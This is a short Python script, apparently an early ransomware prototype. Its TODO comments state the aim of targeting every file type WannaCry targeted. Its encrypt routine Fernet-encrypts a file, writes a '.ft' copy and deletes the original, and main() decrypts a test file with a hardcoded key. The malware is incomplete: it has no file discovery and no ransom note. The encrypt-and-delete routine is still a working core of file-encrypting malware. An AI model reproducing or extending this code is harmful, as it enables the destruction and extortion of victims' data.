#!/usr/bin/env python3

# TODO: The key is generated or given as arguments to encrypt, of course for decrypt the key is needed.
# TODO: encrypt
# TODO: decrypt
# TODO: Target all the file targeted by wannacry

import argparse
import os
from typing import Any

from cryptography.fernet import Fernet

def get_content_file(path_to_file: str) -> bytes:
    content = None
    with open(path_to_file, 'rb') as file:
        content = file.read()
        file.close()
    return content

def write_content_file(path_to_file: str, content: Any):
    with open(path_to_file, 'wb') as file:
        content = file.write(content)
        file.close()

def remove_file(path_to_file: str):
    os.remove(path_to_file)

def encrypt_file(path_to_file: str, key: bytes):
    try:
        f = Fernet(key)
        token = f.encrypt(get_content_file(path_to_file))
        write_content_file(path_to_file + ".ft",token)
        remove_file(path_to_file)
    except Exception as e:
        print(f"Failed for {e}")

def decrypt_file(file_to_decrypt: str, key: bytes):
        f = Fernet(key)
        content_to_decrypt = get_content_file(file_to_decrypt)
        write_content_file(file_to_decrypt, f.decrypt(content_to_decrypt))
        # return f.decrypt(content_to_decrypt)


def main():
    # parser = argparse.ArgumentParser()
    # parser.add_argument("-g","--hex-key",help="The path of the key file, must be at least 64 character in hexadecimal")
    # parser.add_argument("-k","--gen-password",action="store_true",help="generate a new temporary password")
    # args = parser.parse_args()
    key = Fernet.generate_key()
    print(key)
    # encrypt_file("Makefile_to_c",key)
    decrypt_file("Makefile_to_c.ft",b'LmXY5Ljf8EFk8zFeKAr4oWlyptDgsI3M0dSACeJfK_E=')

    # kdf()



if __name__ == "__main__":
    main()
